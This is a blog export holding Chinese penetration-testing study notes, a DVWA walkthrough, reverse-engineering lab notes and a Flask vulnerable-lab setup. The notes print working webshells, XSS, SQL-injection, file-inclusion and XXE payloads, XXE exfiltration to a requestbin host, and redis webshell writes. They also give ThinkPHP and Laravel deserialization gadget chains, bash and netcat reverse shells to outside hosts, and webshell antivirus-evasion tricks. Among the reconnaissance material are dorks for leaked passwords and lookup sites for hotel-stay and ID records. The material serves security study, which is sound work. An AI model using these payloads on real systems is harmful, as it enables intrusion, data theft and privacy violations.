{"meta":{"title":"岩窟的blog","subtitle":"琥珀","description":"","author":"yanku","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-04-13T15:21:41.000Z","updated":"2020-04-13T15:22:09.476Z","comments":false,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-04-13T15:22:23.000Z","updated":"2020-04-13T15:22:23.477Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-04-13T15:20:18.000Z","updated":"2020-05-14T11:54:26.530Z","comments":false,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"study","slug":"study","date":"2020-08-26T08:43:33.000Z","updated":"2020-08-26T09:08:01.875Z","comments":true,"path":"2020/08/26/study/","link":"","permalink":"http://yoursite.com/2020/08/26/study/","excerpt":"","text":"渗透测试基础输入时一定要注意符号问题，中英文 0.0.0.0默认监听所有端口 渗透测试（是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法 受信任， 脱库点到为止—count —start—stop， web有cs，bs结构，渗透手段有端口扫描、SSH口令爆破、FTP爆破、缓冲区溢出攻击，web攻击 渗透测试阶段 前期交互 信息收集 威胁建模 漏洞分析 渗透攻击 后渗透攻击 渗透报告 渗透测试的本质就是信息收集（侯亮micro8） 挖边缘业务漏洞 expolit.db漏洞库 inutl:t.me 社工库 中间件：apache，iis，tomcat。nginx 服务架构：lnmp,lamp，linux nginx/apache，mysql，php url编码 switchyomega代理 http请求：get,post,head,put,options http报文，状态码4为客户端，5为服务端 403为存在目录，但禁止访问 蚁剑 apt -update自动换更新源，不需要vim 信息收集技术端口扫描，webrobot目录扫描 *的隐藏密码可以改变google检查中的type=“password”为type=”任意字符“来获取密码 google通配符* 逻辑非- 2333 -习近平 去除百度右边广告 site:baidu.com 扫资产 intitle:后台登录 inurl:url 关键字 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms intitle:登录 site:baidu.com -zhidao.baidu.com -baike.baidu.com -jingyan.baidu.com filetype:mdb|doc|xlsx|pdf 密码 filetype:xls intitle:北京赛车 inurl:gov.cn shodanhttps://www.shodan.io/ Hikvision-Webs country:cn city:nanjing P@ssw0rd 同模板网站查询 http.favicon.hash：hash hash为favicon.ico在shodan中的hash或mmh3.hash import mmh3 import requests response = requests.get(&#39;https://www.baidu.com/favicon.ico&#39;) favicon = response.content.encode(&#39;base64&#39;) hash = mmh3.hash(favicon) print(hash) 黑色星期五11月27号买shodan shodan类似网站zoomeye（知道创宇） fofa.co 子域名收集https://phpinfo.me/domain （线上） https://github.com/lijiejie/subDomainsBrute subDomainsBrute https://github.com/euphrat1ca/LayerDomainFinderLayer 子域名挖掘机 OneForAll https://www.sqlsec.com/2020/05/webscan.html Django 编写 Web 漏洞扫描器挖坑记录 # 爱站 https://baidurank.aizhan.com/baidu/{domain}/ # 百度云观测 http://ce.baidu.com/index/getRelatedSites?site_address={domain} # hackertarget https://api.hackertarget.com/hostsearch/?q={domain} # IP138 https://site.ip138.com/{domain}/domain.htm # crt.sh SSL 证书反查 https://crt.sh/?q=%25.{domain} # 千寻 url = &#39;https://www.dnsscan.cn/dns.html&#39; datas = {&quot;ecmsfrom&quot;: &#39;8.8.8.8&#39;, &quot;show&quot;: &#39;none&#39;, &quot;keywords&quot;: domain} 写脚本获取域名 C段与服务器信息无cdn https://dns.aizhan.com/ 爱站 scanport https://github.com/zer0h/httpscan HTTPScan 有cdn的话 国内的 CDN 往往只会针对国内用户访问加速，但是 国外就不一定了。因此通过国外代理访问就能查看真实 IP 了，或者通过国外的 DNS 解析，可能就能得到真实的 IP https://ping.aizhan.com/ http://ping.chinaz.com/ 多地ping https://viewdns.info/ https://x.threatbook.cn/ https://sitereport.netcraft.com/查询 ip 与域名绑定历史记录，可能会发现使用 CDN 之前的目标 ip。 邮件中可以查询IP地址 社工信息收集whois查询whois.bugscaner.com whois.aizhan.com whois.chinaz.com 注册网站查询www.reg007.com 密码泄露查询https://haveibeenpwned.com 开房记录查询http://www.cxjlkf.com 国家职业资格证查询http://zscx.osta.org.cn 其他查询身份证查询 http://www.2cha.com 经纬度查询 http://www.gpsspg.com/maps.htm http://map.yanue.net/ http://www.gzhatu.com/jingweidu.html 通过iphone的图片获取现实地址 微信搜索 https://weixin.sogou.com 泄露网站查询 https://haveibeenpwned.com/PwnedWebsites 邮件泄露查询 https://www.hotsheet.com/inoitsu/ 密码强度检测 https://passwordsecurity.info https://haveibeenpwned.com/Passwords Github 信息收集 password @qq.com db_pass 端口扫描主动与被动 nmapip -o 扫系统类型 10.11.30.1/24 -v 扫c段，-v输出日志 -p 端口 -p0/pn 不进行ping --packet-trace 查看协议扫描的细节 -PR选项通常在扫描局域网时使用 --traceroute 路由跟踪 | -oN | 标准保存 | | ---- | -------- | | -oX | XML 保存 | zenmapquick scan plus模式 10.11.30.1/24 linux扫描#!/bin/bash ip=&quot;172.16.114.&quot; echo &quot;ping log:&quot; &gt; ./ping.txt for i in {1..254} do ping -c 1 -w 1 -W 1 $ip$i | grep -q &quot;ttl=&quot; &amp;&amp; echo &quot;$ip$i [yes]&quot; &gt;&gt; ./ping.txt || echo &quot;$ip$i [no]&quot; &gt;&gt; ./ping.txt &amp; done echo &quot;wait 5s....&quot; sleep 5 cat ./ping.txt cat ./ping.txt | wc -l windows扫描for /l %p in (1,1,254) do @ping 10.20.24.%p -n 1 -l 16 -w 20 |find &quot;TTL=&quot; /I cmder windows下可以使用linux命令 masscanhttps://github.com/robertdavidgraham/masscan masscan -sL 10.0.0.0/24 &gt; c段.txt masscan -sL 10.0.0.0/16 &gt; b段.txt masscan -sL 10.0.0.0/8 &gt; a段.txt # 输出到文件中 masscan 0.0.0.0/0 -p0-65535 -oX scan.xml massan扫b段（10.1.1.1/16）后发现c（段10.1.5.1/24）资产再用nmap扫c段 正则用pycharm对字符串进行正则替换 ((2(5[0-5]|[0-4]\\d))|[0-1]?\\d{1,2})(\\.((2(5[0-5]|[0-4]\\d))|[0-1]?\\d{1,2})){3} # 换行 ^\\s*(?=\\r?$)\\n ^匹配头部，$匹配尾部 GOBYhttps://cn.gobies.org/ 漏洞扫描awvs# pull 拉取下载镜像 docker pull secfa/docker-awvs # 将Docker的3443端口映射到物理机的 13443端口 docker run -it -d -p 13443:3443 secfa/docker-awvs # 容器的相关信息 awvs13 username: admin@admin.com awvs13 password: Admin123 AWVS版本：13.0.200217097 浏览器访问：https://127.0.0.1:13443/ 即可 webrobot类似awvs目录扫描 漏洞网站 http://testphp.vulnweb.com/ nessus可以用来扫主机 x-ray挖洞 身份认证web认证bp普通爆破 https://www.ctfhub.com/ Pitchfork模式爆破token，找到 「Grep - Extract」添加一个 Grep 查询筛选， 接着点击refetch response，然后鼠标选择要提取的 token，此时 Burpsuite 会自动生成对应的匹配规则 使用 Burpsuite 进行无验证码爆破 使用 Burpsuite 进行 Basic 认证爆破 使用 Burpsuite 进行纯数字爆破 使用 Pkav HTTP Fuzzer 进行带验证码的爆破 tomcat8.0及以上爆破用msf 系统认证https://github.com/vanhauser-thc/thc-hydra https://github.com/shack2/SNETCracker 能爆smb就不要rdp SMB 爆破首选 MSF redis被爆破速度超级快 redis未授权访问1改变ssh 公私钥需要手动换三行 2web /var/www/html shell.php &lt;?php @eval($_POST[&#39;attack&#39;]);?&gt; 3定时 弹shell XSS反射“” ‘’ //三种包含方式 &lt;script&gt;alert(document.cookie)&lt;/script&gt; &lt;img src=x onerror=alert(&#39;XSS&#39;)&gt; 存储提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS DOM&#39; onerror=alert(233) x=&#39; &#39; onerror=alert(233) // 绕过alert被过滤时，可以用promat或 xsspayload&lt;img src=x onerror=confirm(1)&gt; 双写，大写绕过， &lt;img src=x onerror=alert(&#39;XSS&#39;)&gt; 也可以通过String.fromCharCode()编码来绕过，使用Hackbar可以很方便地进行编码alert(‘XSS’)经过String.fromCharCode()编码为: String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41) name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))&lt;/scr &#39;&lt;?php echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;存在漏洞，htmlentities不过滤&#39;,&#39;&#39;闭合 前端改限制输入长度 真实蓝莲花或https://xss8.cc/xss.php或***xss.pt***写xss脚本，生成payload，将有xss漏洞的页面与payload合成，站长之家生成短链 盲打钓鱼网站，网站生成脚本，直接提交 csrfbp生成csrf表单 添加自动提交 &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; sql注入技巧输入?id=1’x或1”x等，复制 ‘x”) LIMIT 0,1’ 中间的部分，补足左边的部分 来得到sql语句(“x”) LIMIT 0,1 /**/代替空格 hackbarpost不能将空格替换为+ SEPARATOR +分隔符 http://localhost/sqli-labs/Less-4/ ?id=-1&quot;) union select 1,(SELECT+GROUP_CONCAT(username,password,id+SEPARATOR+0x3c62723e)+FROM+users),3--+ sqlmap-v 3 —risk 3 —-technique=E 报错注入=U联合查询 —user-agent=”hacker by qq11111”扫gov警告 —random-agent 绕waf —prefix 和 —suffix 文件上传木马asp &lt;%eval request(&quot;x&quot;)%&gt; &lt;%execute request(&quot;x&quot;)%&gt; php &lt;?php eval($_POST[&#39;x&#39;]);?&gt; _get,_request,_cookie &lt;?php assert($_POST[&#39;x&#39;]);?&gt; jsp &lt;% if(&quot;x&quot;.equals(request.getParameter(&quot;pwd&quot;))) { java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1) { out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); } %&gt; jar cvf cmd.war cmd.jsp 访问war/war.jsp chrome调试在soures下断点，运行后在修改前端代码 htaccessAddType application/x-httpd-php .png mimeimage/png 图片木马添加后缀 后缀 文件头 文本类型 PNG 89504E47 ‰[不可显示字符]PNG GIF 47494638 GIF89a JPEG FFD8FF ÿØÿ windows生成图马 copy pic.jpg/b+shell.php/a shell.jpg 参数/b指定以二进制格式复制、合并文件， 用于图像类/声音类文件 参数/a指定以 ASCII 格式复制、合并文件，用于 txt 等文本类文件 linux cat shell.php &gt;&gt; shell.png 图马上传到一半抓包改为php上传 00截断PHP&lt;5.8.4 关闭magic_quotes_gpc 修改var/www/html/upload ​ 为var/www/html/upload/x.php%00 然后正常上传png 条件竞争删除前不停上传并访问生成2次木马 &lt;?php fputs(fopen(&#39;gg.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[1])?&gt;&#39;);?&gt; 文件包含phpinclude(), include_once(), require(), require_once(), fopen(), readfile() 本地 ?file=../../../../../../../../windows/win.ini ?file=C:\\Windows\\win.ini 远程 ?file=http://192.168.31.89/fi/payload.txt ?file=http://www.baidu.com/robots.txt（通用测试是否允许远程文件包含） ？file=file:///C:/Windows/win.ini 截断php&lt;=5.34%00截断 路径长度截断 点号截断 php所有版本# 空格截断 ?file=http://192.168.31.89/fi/payload.txt%20 # 问号截断 ?file=http://192.168.31.89/fi/payload.txt? # 井号截断 ?file=http://192.168.31.89/fi/payload.txt%23 伪协议php://filter（文件读取?file=php://filter/read=convert.base64-encode/resource=index.php ?file=php://filter/convert.base64-encode/resource=index.php php://input（写入木马）?file=php://input post数据 &lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;pass&quot;])?&gt;&#39;);?&gt; data://伪协议条件： allow_url_fopen=On allow_url_include=On PHP &gt; 5.2 ?file=data:text/plain,&lt;?php phpinfo();?&gt; ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b &lt;?php phpinfo();?&gt; base64编码后url编码为PD9waHAgcGhwaW5mbygpOz8%2b phar://伪协议条件：PHP &gt;= 5.3 ?file=phar://payload.zip/payload.txt ?file=phar://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip/payload.txt zip://伪协议?file=zip://C:/PhpStudy/PHPTutorial/WWW/fi/payload.zip%23payload.txt 技巧LFI 头像，日志，session， SSRF作用扫描，指纹识别，file读文件，dict探测端口，Gopher://协议 漏洞函数PHP: 1. file_get_contents() 2. fsockopen() 3. curl_exec() 4. fopen() Python: 1. urllib 库http头注入 2. requests 等库中默认跟随30x跳转 写shell正常写redis-cli -h 127.0.0.1 flushall redis-cli -h 127.0.0.1 config set dir /var/www/html redis-cli -h 127.0.0.1 config set dbfilename shell.php redis-cli -h 127.0.0.1 set webshell &quot;&lt;?php phpinfo(); ?&gt;&quot; redis-cli -h 127.0.0.1 save ssrfgopher*为参数数量，$为参数长度 Gopherus-master可以自动生成gopher payload, 选择phpshell，for-data不解码，www-urlencode和get请求需要在编码一次 ，默认网页位置为/var/www/html/index.php 可以urllib头注入 利用http状态码30x 来探测端口、服务，穿过几层就编码几次 绕过短网址生成xip.io127.0.0.1.xip.io 协议绕过file://localhost/etc/passwd file://localhost/etc/hosts file:///proc/net/fib_trie ip格式数字地址(十进制)：127.0.0.1-&gt;2130706433 把.换成。 十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01 八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01 省略写法：127.0.0.1-&gt;127.1 如127.0.0.1：http://localhost/ 进阶利用log，time，差异化 dns rebindinghttp://ceye.io/profile 有一个域名，开了 dns rebinding 那个功能，设置返回 223.5.5.5 和 127.0.0.1 验证时解析该域名返回 223.5.5.5，通过。 正式请求时该域名解析返回的则是 127.0.0.1。 XXE有回显 file:///etc/passwd http://127.0.0.1:8891/hide.phpphar://phar.phar/test.txt 无回显 http.requestbin.buuoj.cn/获取请求内容 &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://http.requestbin.buuoj.cn/179swmw1?p=%file;&#39;&gt;&quot;&gt; &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt; &lt;!DOCTYPE dasctf[ &lt;!ENTITY % remote SYSTEM &quot;http://10.11.33.142:8081/test2.dtd&quot; &gt; %remote;%int;%send; ]&gt; &lt;books&gt; &lt;name&gt;abc&lt;/name&gt; &lt;/books&gt; 代码执行漏洞函数` ` eval(&quot;phpinfo();&quot;),需要加; assert(&quot;phpinfo()&quot;) popen exec passthru phpstormphp -S 127.0.0.1:8091 -t ./ 运行 ctrl+shirt+f全局搜索 eval(&#39;?&gt;&#39; . file_get_contents(&#39; 高危函数file_get_contents(‘php://input’)，eval()等找可以控制的地方 image-20200806112825072 image-20200806112711269 image-20200806112931359 curl不用看 image-20200806113110626 ;whoami &gt; /var/www/html/a.txt;插入命令之間 image-20200806113149458 宝塔防火墙，通过白名单跳转/白名单/../index.php?s=wechat/Review/img&amp;url=ph%61r:// 反序列化php类public都可以访问，protected类和子类的方法，private类的方法 漏洞函数tostring,destruct,wakeup image-20200806143533438 image-20200806143141253 漏洞利用$flag = new flag(); $flag-&gt;obj = new flag3(); $flag-&gt;obj-&gt;cmd = &quot;whoami&quot;; echo serialize($flag); 生成phar压缩包 $phar = new Phar(&quot;phar.phar&quot;); $phar -&gt; startBuffering(); $phar -&gt; setStub(&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);//必要项 $b = new B(&#39;system($_GET[a]);&#39;); $o = new A($b); $phar -&gt; setMetadata($o); $phar -&gt; addFromString(&quot;test.txt&quot;,&quot;test&quot;); $phar -&gt; stopBuffering(); 访问 http://127.0.0.1:8891/S10.php?file=phar:///tmp/upload/5f2ba8ae709a9.phar/test.txt thinkphp5.0.24反序列化&lt;?php //File类 namespace think\\cache\\driver; class File { // tag变量跟文件名有关 protected $tag=&#39;abcdef&#39;; protected $options = [ &#39;expire&#39; =&gt; 3600, &#39;cache_subdir&#39; =&gt; false, &#39;prefix&#39; =&gt; &#39;&#39;, // 写入文件 &#39;path&#39; =&gt; &#39;php://filter//convert.iconv.UCS-2LE.UCS-2BE/resource=.//static/?&lt;hp pvela$(P_SO[T]x;)&gt;?/../&#39;, // 创建子目录 // &#39;path&#39; =&gt; &#39;./static/runtime/&#39;, &#39;data_compress&#39; =&gt; false, ]; } //Memcached类 namespace think\\session\\driver; use think\\cache\\driver\\File; class Memcached { protected $handler = null; function __construct() { $this-&gt;handler=new File(); } } //Output类 namespace think\\console; use think\\session\\driver\\Memcached; class Output { protected $styles = [&#39;removeWhereField&#39;]; private $handle = null; function __construct() { $this-&gt;handle=new Memcached(); } } //HasOne类 namespace think\\model\\relation; use think\\console\\Output; class HasOne { protected $query = false; function __construct() { $this-&gt;query=new Output(); } } //Pivot类 namespace think\\model; use think\\model\\relation\\HasOne; class Pivot { protected $append = [&#39;getError&#39;]; protected $error = false; public function __construct() { $this-&gt;error=new HasOne(); } } //Windows类 namespace think\\process\\pipes; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; } } $x=new Windows(); echo base64_encode(serialize($x)); var_dump(iconv(&quot;UCS-2BE&quot;, &quot;UCS-2LE&quot;, &#39;&lt;?php eval($_POST[x]);?&gt;&#39;)); laravel反序列化&lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem{ } } namespace Symfony\\Component\\Cache\\Adapter{ use Symfony\\Component\\Cache\\CacheItem; class PhpArrayAdapter{ private $file; public function __construct() { $this-&gt;file = &#39;/etc/passwd&#39;; } } class TagAwareAdapter{ private $deferred = []; private $pool; public function __construct() { $this-&gt;deferred = array(&#39;aaa&#39; =&gt; new CacheItem()); $this-&gt;pool = new PhpArrayAdapter(); } } $obj = new TagAwareAdapter(); echo urlencode(serialize($obj)); } java反序列化ACED开头的十六进制文件为序列化字符串，生成该文件的地方存在反序列化漏洞 通过反射来创建类对象，来调用方法 利用方法找到反序列化数据输入点， 找到 反射调用任意类的点 - 找到从输入点到反射点的链条 https://mvnrepository.com/artifact/commons-collections/commons-collections/3.1 反序列原理 https://xz.aliyun.com/t/6787#toc-10 反序列原理 https://github.com/frohoff/ysoserial 自动化检测 java反序列化 除了链条和反射点，我们还要有反序列化点。 常出现在： HTTP参数中 - Cookie：Shiro RMI 协议：Java远程方法调用，在RMI中传输的数据皆为序列化 JMX：一个为应用程序植入管理功能的框架 自定义协议：用来接收与发送原始的java对象 - Dubbo 逻辑漏洞逻辑漏洞更多指一些业务类特有的逻辑漏洞，这些漏洞的特点是很难判断是否为漏洞。比如在一个商场系统中，用户 A 可以看到用户 B 的订单信息，对于计算机来说，程序运行是没有问题的，因为开发者就是这么设计的，但是对用用户来说，B 用户就会觉得自己的隐私泄露了。所以逻辑漏洞通常需要人为来判断是否为漏洞，而且大多数是程序猿设计开发之处没有考虑周到产生的。 常见的业务逻辑型漏洞，包括验证码安全、用户密码找回、接口盗用、账户越权、支付漏洞等问题，相比于如 SQL 注入漏洞、XSS 漏洞、上传、命令执行等传统应用安全方面的漏洞，现在的攻击者更倾向于去挖掘业务逻辑层面的安全问题，这类问题往往容易被开发者所忽视，同时也具有很大的危害性 越权可以用同一个Cookie身份去测试其他角色可以执行的操作，如果可以成功执行，基本上是存在垂直越权漏洞的 image-20200806090836565 验证码空验证码，数字爆破，凭证返回，首次绕过 在phone=18666666666的号码后面添加不为数字的字符时,有可能绕过限制 控制变量法 ncat -lvp 8000 python -m SimpleHTTPServer 8000开启监听 越权 请求中不存在参数，只用 cookie 进行身份验证，通常不可越权。 请求中存在参数，并且参数中的某些值可能是辨别信息的唯一值（如userID、IDNO、departmentID、key、ID等），可能存在越权（越权的原因通常是参数中的 userID(例如)没有判断是否与cookie中用户属同一用户） 支付数量，金额，重复发包 密码弱token，注册覆盖，本地验证绕过，跳过验证步骤 bp可以拦截响应包进行修改进行欺骗 image-20200807110005706 思路 是否有后台管理系统 能否使用其他研究生学号暴力破解密码 是否存在逻辑漏洞 上网认证系统 or 校园网自助服务系统 Jboss 搭建的应用是否存在Java反序列化漏洞 ©2000-2016 锐捷网络 历史上是否爆出相关的漏洞 60167@njnu.edu.cn 这个学习校园网管理员的邮箱 是否可以社工? 反弹shellnc-e：将传入的信息以命令执行;-l:使用监听模式，监控传入的信息 nc -l -e /bin/bash 2333将传入的信息以命令执行 -k: 客户端断掉连接时，服务端依然保持运行 -v：现实指令执行过程细节 nc -lvk -e /bin/bash 2333 -w: 设置等待连线的时间秒数 nc -w 10 -e /bin/bash www.sqlsec.com 2333 nc ip port连接机子 bash如果控制的目标机器自带的nc不支持-e选项，那如何将shell弹出去呢？这里可以利用自带的bash命令交互环境来实现这个操作：攻击者外网监听：-p port 本地端口 nc -lvp 2333 被入侵的目标机器执行如下命令： bash -i &gt;&amp; /dev/tcp/10.211.55.4/2333 0&gt;&amp;1 传文件nc -l 2333 &gt; hello.txt上传 nc www.sqlsec.com 2333 &lt; hello.txt 扫描端口nc -v -n -z 10.211.55.14 20-25 webshell一句话&lt;?php @eval($_POST[&#39;a&#39;];?&gt; 查杀工具D盾 windows 河马 跨平台 免杀eval与assertEVAL全都可以执行，assert必须7.1以下 字符串变形substr strtr substr_replace trim 改变语序 改变语序+敏感词变形 改变语序+敏感词外传 敏感词外传+敏感词变形 特殊字符干扰亦或import string from urllib.parse import quote keys = list(range(65)) + list(range(91,97)) + list(range(123,127)) results = [] for i in keys: for j in keys: asscii_number = i^j if (asscii_number &gt;= 65 and asscii_number &lt;= 90) or (asscii_number &gt;= 97 and asscii_number &lt;= 122): if i &lt; 32 and j &lt; 32: temp = (f&#39;{chr(asscii_number)} = ascii:{i} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}&#39;, ch r(asscii_number)) results.append(temp) elif i &lt; 32 and j &gt;=32: temp = (f&#39;{chr(asscii_number)} = ascii:{i} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}&#39;, chr (asscii_number)) results.append(temp) elif i &gt;= 32 and j &lt; 32: temp = (f&#39;{chr(asscii_number)} = {chr(i)} ^ ascii{j} = {quote(chr(i))} ^ {quote(chr(j))}&#39;, chr( asscii_number)) results.append(temp) else: temp = (f&#39;{chr(asscii_number)} = {chr(i)} ^ {chr(j)} = {quote(chr(i))} ^ {quote(chr(j))}&#39;, chr( asscii_number)) results.append(temp) results.sort(key=lambda x:x[1], reverse=False) for low_case in string.ascii_lowercase: for result in results: if low_case in result: print(result[0]) for upper_case in string.ascii_uppercase: for result in results: if upper_case in result: print(result[0] 自定义函数绕过&lt;?php function sqlsec($a){ $a($_POST[&#39;x&#39;]); } sqlsec(assert); ?&gt; 字符串变形字符串变形+参数传递自定义类rot13过 反序列化回调函数php手册搜/e等参数找回调函数 回调函数变形数组或多维数组安全狗拦截get，不拦截post php代码太多了就不沾笔记上了","categories":[],"tags":[]},{"title":"flask下实现漏洞靶场","slug":"flask","date":"2020-07-30T08:42:19.000Z","updated":"2020-08-26T08:59:09.112Z","comments":true,"path":"2020/07/30/flask/","link":"","permalink":"http://yoursite.com/2020/07/30/flask/","excerpt":"","text":"综述1.项目架构​ 在flask框架来构建web项目，主文件为app.py,数据库操作文件为db.py，并在\\templates下储存模板文件，在show.html下进行web攻击 2. show.html@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def index(): return render_template(&#39;show.html&#39;) 调用视图函数来将show.html运行 3. db.py4. Docker安装本地安装Docker 1.Docker 软件包已经包含在默认的 CentOS-Extras 软件源里，安装命令如下： $ sudo yum -y install docker 2.安装完成以后可以查看下载的Docker版本 $ docker -v 3.安装完成以后启动Docker $ sudo service docker start 4.如果希望 Docker 默认开机启动，如下操作： $ sudo chkconfig docker on 使用镜像加速器 vim修改/etc/docker/daemon.json的地址如下： { &quot;registry-mirrors&quot;: [&quot;https://xxxxxxx.mirror.aliyuncs.com&quot;] } 然后使配置生效： $ sudo systemctl daemon-reload 重启Docker $ sudo service docker restart 使用docker用户组 docker 进程通过监听一个 Unix Socket 来替代 TCP 端口。在默认情况下，docker 的 Unix Socket属于root用户，当然其他用户可以使用sudo方式来访问。因为这个原因， docker 进程就一直是root用户运行的。为了在使用 docker 命令的时候前边不再加sudo，我们需要创建一个叫 docker 的用户组，并且为用户组添加用户。然后在 docker 进程启动的时候，我们的 docker 群组有了 Unix Socket 的所有权，可以对 Socket 文件进行读写。 创建docker用户组 $ sudo groupadd docker 将用户添加到docker用户组 $ sudo gpasswd -a gard3nia docker 重启系统登录即可 $ reboot Docker使用 镜像操作 搜索镜像 docker search imagename 拉取镜像 docker pull imagename 列出本地镜像 docker images 删除镜像 docker rmi imagename 新建容器 docker run [OPTIONS] IMAGE [COMMAND] [ARG...] 源码链接：https://pan.baidu.com/s/1XXaf_qSRhU5uLNmWGdkbRA提取码：r0ow","categories":[{"name":"靶场","slug":"靶场","permalink":"http://yoursite.com/categories/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"编程","slug":"编程","permalink":"http://yoursite.com/tags/%E7%BC%96%E7%A8%8B/"}]},{"title":"逆向","slug":"nixiang","date":"2020-05-09T03:33:41.000Z","updated":"2020-05-09T03:37:54.657Z","comments":true,"path":"2020/05/09/nixiang/","link":"","permalink":"http://yoursite.com/2020/05/09/nixiang/","excerpt":"","text":"\\6. 根据crackme，overflow，overflow2，overflow3的二进制程序，复现授课中的利用过程 1) Crackme**：** 关键为 jz short * YQCUgO.png 修改指令 保存修改 正确密码无法得到正常结果 YQC228.png 2) OF1**：** 开始调试 YQCRxS.png 7个q没有改变局部变量的值 8个q执行前 执行后发生了栈溢出 3) OF2**：** 记录函数正确输出地址 任意填充8字符覆盖password，4字符覆盖authenticated，4字符覆盖上一栈帧的ebp,填入4个字符返回地址，判断地址是大端序还是小端序读入。 攻击成功 4) OF3**：** 在xp下运行ollydbug，记录ebp,返回地址等 获取mssageboxa地址 获取jmp esp和exit地址 Password代码： 结果成功","categories":[{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/categories/%E9%80%86%E5%90%91/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://yoursite.com/tags/%E9%80%86%E5%90%91/"}]},{"title":"dvwa","slug":"dvwa","date":"2020-05-09T03:33:29.000Z","updated":"2020-05-09T04:48:19.965Z","comments":true,"path":"2020/05/09/dvwa/","link":"","permalink":"http://yoursite.com/2020/05/09/dvwa/","excerpt":"","text":"1) Brute Force Low：首先将火狐浏览器设置代理 然后输入用户名admin密码a 再用brutesuite截获报文 用CTRL+I将报文发送给Intruder,然后点clear消除变量，在选择密码进行add 在payload里添加字典 开始攻击 攻击成功找到密码 Mid： 对比low和mid的源码发现mid中多了mysql_real_escape_string() 函数，而该函数是转义字符不影响暴力破解 采取步骤与low一样，最后结果大同小异 YQS0Ds.png High： 查看源码发现在mid的基础上增添了一个新的函数stripslashes和sleep（3）延时3秒，stripslashes()函数用于清理字符串中的反斜杠（\\），依旧不影响暴力破解。 YQS4bR.png 破解成功 2) SQL Injection 注入前应该知道的基本信息： | SCHEMATA ――&gt;存储数据库名的， |——&gt;关键字段：SCHEMA_NAME，表示数据库名称 TABLES ――&gt;存储表名的 TABLE_SCHEMA表示表所属的数据库名称； TABLE_NAME表示表的名称 COLUMNS ――&gt;存储字段名的 TABLE_NAME表示所属的表的名称 COLUMN_NAME表示字段名 Low： 查看源码，发现没有加过滤函数 发现存在字符型注入 判断有几个字段 1’ or 1=1 order by 2 # 获取数据库名称 查询表名 查询字段名 获取数据 Mid： 查看源码 发现仅仅是加了一个mysql_real_escape_string() 函数，这仅仅对 \\x00 \\n \\r \\ ‘ “ \\x1a 等字符有影响，我们可以用char码绕过，例如Char(“61”) 为=，或者转化为16，8进制， 其余步骤与low大同小异 只需将过滤的字符编码即可通过。 存在数字型注入 判断数据库名 判断表名 直接输入表名不行，可以转化为16进制绕过 获取数据 1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # High： 查看源码 仅仅是多了一个limit，但可以注释掉所以和上述过长一样，就不再赘述 1&#39; or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users # 查询成功： 3) SQL Injection(Blind) 通过sqlmap来进行盲注 首先f12查看cookies 然后kali使用sqlmap注入 查看所有数据库 YQpxlF.png 用current-db查看当前数据库 查看有几个数据项 YQ9CwR.png 获取数据 YQ9tXQ.png Mid 用burpsuite抓包 YQ9a0s.png 使用1’ and 1=2 #或着1进行测试发现是数字型注入 [ YQ90kq.png](https://s1.ax1x.com/2020/05/09/YQ90kq.png) 注入发现是4位数据库 通过回复时间可以发现第一个字符为d 不断注入直至猜解表中的字段名时，猜解字段名的长度，对字段值users进行16进制转换为0x7573657273与sql injection操作类似 High： 有两点干扰： 对于LIMIT 1的限制输出记录数目，可以利用#注释其限制； 服务端可能会随机执行sleep()函数，做执行，则延迟的时间是随机在2-4s，所以可以判断dvwa给与回复的类型来判断是否得到结果或者等待10秒与mid类似。 剩余操作为盲注和普通注入的重复操作，在这里不再赘述 4) XSS reflected Low: 查看源代码 没有安全措施直接攻击 &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; Mid： 查看源代码 该代码中删除输入的 &lt;script&gt; ，只需输入两个 &lt;script&gt; ，或者大写其中字符 High： YQ9qnH.png 通过正则表达式过滤 &lt;script&gt; ，可以通过img、body等或者iframe等标签的src注入恶意的js代码 &lt;IMG src=1 onerror=alert(“AAA”)&gt; 5) XSS stored Low: 查看源代码 [ 